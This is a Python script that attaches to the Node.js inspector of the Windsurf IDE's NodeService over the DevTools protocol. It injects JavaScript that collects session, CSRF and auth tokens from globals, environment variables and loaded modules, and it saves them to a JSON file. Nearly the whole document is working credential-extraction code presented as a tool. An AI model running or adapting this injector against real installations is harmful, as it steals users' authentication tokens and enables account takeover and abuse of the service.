#!/usr/bin/env python3
"""
Windsurf NodeService Inspector Token Injector
Connects to NodeService inspector and injects code to extract auth tokens.
"""

import asyncio
import json
import sys
from pathlib import Path
from typing import Optional

try:
    import websockets
    import aiohttp
except ImportError:
    print("❌ Missing dependencies. Install with:")
    print("   pip install websockets aiohttp")
    sys.exit(1)

# Import inspector helper
try:
    from windsurf_inspector_helper import find_node_inspector_port
except ImportError:
    print("❌ Cannot import windsurf_inspector_helper.py")
    sys.exit(1)


class NodeServiceInspector:
    """Connect to NodeService inspector and inject code."""
    
    def __init__(self, port: Optional[int] = None):
        self.port = port
        self.ws: Optional[websockets.WebSocketClientProtocol] = None
        self.msg_id = 0
    
    async def connect(self) -> bool:
        """Connect to NodeService inspector."""
        try:
            # Auto-detect port if not provided
            if self.port is None:
                print("🔍 Auto-detecting NodeService inspector port...")
                self.port = find_node_inspector_port()
                if not self.port:
                    print("❌ Cannot detect NodeService inspector port")
                    return False
                print(f"✅ Detected inspector on port {self.port}")
            
            # Get WebSocket URL
            async with aiohttp.ClientSession() as session:
                async with session.get(f"http://127.0.0.1:{self.port}/json") as resp:
                    if resp.status != 200:
                        print(f"❌ Inspector not available on port {self.port}")
                        return False
                    
                    targets = await resp.json()
            
            if not targets:
                print("❌ No inspector targets found")
                return False
            
            # Connect to first target
            target = targets[0]
            ws_url = target["webSocketDebuggerUrl"]
            
            print(f"✅ Connecting to: {target['title']}")
            self.ws = await websockets.connect(ws_url)
            print("✅ WebSocket connected")
            
            return True
        
        except Exception as e:
            print(f"❌ Connection failed: {e}")
            return False
    
    async def send_command(self, method: str, params: Optional[dict] = None) -> dict:
        """Send CDP command and wait for response."""
        if not self.ws:
            raise RuntimeError("Not connected")
        
        self.msg_id += 1
        msg = {
            "id": self.msg_id,
            "method": method,
            "params": params or {}
        }
        
        await self.ws.send(json.dumps(msg))
        
        # Wait for matching response
        while True:
            resp_raw = await self.ws.recv()
            resp = json.loads(resp_raw)
            
            if resp.get("id") == self.msg_id:
                return resp
    
    async def evaluate_js(self, expression: str) -> dict:
        """Evaluate JavaScript expression in Node.js context."""
        result = await self.send_command("Runtime.evaluate", {
            "expression": expression,
            "returnByValue": True
        })
        return result
    
    async def search_for_tokens(self) -> dict:
        """Search for authentication tokens in the Node.js process."""
        print("\n🔍 Searching for authentication tokens...")
        
        tokens = {
            "sessionId": None,
            "csrfToken": None,
            "authToken": None,
            "found_variables": []
        }
        
        # List of JavaScript expressions to try
        search_expressions = [
            # Check global variables
            "typeof global !== 'undefined' ? Object.keys(global).filter(k => k.toLowerCase().includes('session') || k.toLowerCase().includes('token') || k.toLowerCase().includes('auth')) : []",
            
            # Check process.env
            "typeof process !== 'undefined' && process.env ? Object.keys(process.env).filter(k => k.toLowerCase().includes('session') || k.toLowerCase().includes('token') || k.toLowerCase().includes('auth')) : []",
            
            # Try to access common token storage patterns
            "typeof global.sessionId !== 'undefined' ? global.sessionId : null",
            "typeof global.csrfToken !== 'undefined' ? global.csrfToken : null",
            "typeof global.authToken !== 'undefined' ? global.authToken : null",
            
            # Check if there's a config object
            "typeof global.config !== 'undefined' ? JSON.stringify(global.config) : null",
            
            # Check for Cascade-specific variables
            "typeof global.cascade !== 'undefined' ? JSON.stringify(global.cascade) : null",
            "typeof global.codeium !== 'undefined' ? JSON.stringify(global.codeium) : null",
        ]
        
        for expr in search_expressions:
            try:
                print(f"   Trying: {expr[:80]}...")
                result = await self.evaluate_js(expr)
                
                if "result" in result and "value" in result["result"]:
                    value = result["result"]["value"]
                    if value:
                        print(f"   ✅ Found: {str(value)[:100]}")
                        tokens["found_variables"].append({
                            "expression": expr,
                            "value": value
                        })
            except Exception as e:
                print(f"   ⚠️  Error: {e}")
        
        return tokens
    
    async def inject_token_extractor(self) -> dict:
        """Inject a more sophisticated token extraction script."""
        print("\n💉 Injecting token extraction code...")
        
        # JavaScript code to extract tokens from various sources
        injection_code = """
        (function() {
            const results = {
                globalVars: [],
                processEnv: [],
                moduleCache: [],
                possibleTokens: []
            };
            
            // Search global variables
            if (typeof global !== 'undefined') {
                for (const key in global) {
                    const lowerKey = key.toLowerCase();
                    if (lowerKey.includes('session') || lowerKey.includes('token') || 
                        lowerKey.includes('auth') || lowerKey.includes('csrf') ||
                        lowerKey.includes('cascade') || lowerKey.includes('codeium')) {
                        try {
                            const value = global[key];
                            if (typeof value === 'string' || typeof value === 'object') {
                                results.globalVars.push({
                                    key: key,
                                    type: typeof value,
                                    value: typeof value === 'string' ? value : JSON.stringify(value).substring(0, 200)
                                });
                            }
                        } catch (e) {}
                    }
                }
            }
            
            // Search process.env
            if (typeof process !== 'undefined' && process.env) {
                for (const key in process.env) {
                    const lowerKey = key.toLowerCase();
                    if (lowerKey.includes('session') || lowerKey.includes('token') || 
                        lowerKey.includes('auth') || lowerKey.includes('csrf')) {
                        results.processEnv.push({
                            key: key,
                            value: process.env[key]
                        });
                    }
                }
            }
            
            // Search require.cache for loaded modules
            if (typeof require !== 'undefined' && require.cache) {
                for (const modulePath in require.cache) {
                    if (modulePath.toLowerCase().includes('auth') || 
                        modulePath.toLowerCase().includes('token') ||
                        modulePath.toLowerCase().includes('cascade') ||
                        modulePath.toLowerCase().includes('session')) {
                        results.moduleCache.push(modulePath);
                    }
                }
            }
            
            return results;
        })()
        """
        
        try:
            result = await self.evaluate_js(injection_code)
            
            if "result" in result and "value" in result["result"]:
                return result["result"]["value"]
            else:
                print(f"   ⚠️  Unexpected result: {result}")
                return {}
        
        except Exception as e:
            print(f"   ❌ Injection failed: {e}")
            return {}
    
    async def close(self):
        """Close WebSocket connection."""
        if self.ws:
            await self.ws.close()


async def main():
    print("=" * 70)
    print("Windsurf NodeService Inspector Token Injector")
    print("=" * 70)
    print()
    
    inspector = NodeServiceInspector()
    
    try:
        # Connect to inspector
        if not await inspector.connect():
            return 1
        
        # Search for tokens
        tokens = await inspector.search_for_tokens()
        
        # Inject more sophisticated extraction code
        injection_results = await inspector.inject_token_extractor()
        
        # Combine results
        print("\n" + "=" * 70)
        print("📊 EXTRACTION RESULTS")
        print("=" * 70)
        print()
        
        if injection_results:
            print("🔍 Global Variables:")
            for var in injection_results.get("globalVars", []):
                print(f"   - {var['key']} ({var['type']}): {var['value'][:100]}")
            
            print("\n🔍 Process Environment:")
            for env in injection_results.get("processEnv", []):
                print(f"   - {env['key']}: {env['value'][:100]}")
            
            print("\n🔍 Loaded Modules (auth-related):")
            for mod in injection_results.get("moduleCache", [])[:10]:
                print(f"   - {mod}")
        
        # Save results
        output = {
            "tokens": tokens,
            "injection_results": injection_results
        }
        
        output_file = Path("windsurf_inspector_tokens.json")
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(output, f, indent=2)
        
        print(f"\n✅ Results saved to: {output_file}")
        
        return 0
    
    except Exception as e:
        print(f"\n❌ Error: {e}")
        import traceback
        traceback.print_exc()
        return 1
    
    finally:
        await inspector.close()


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
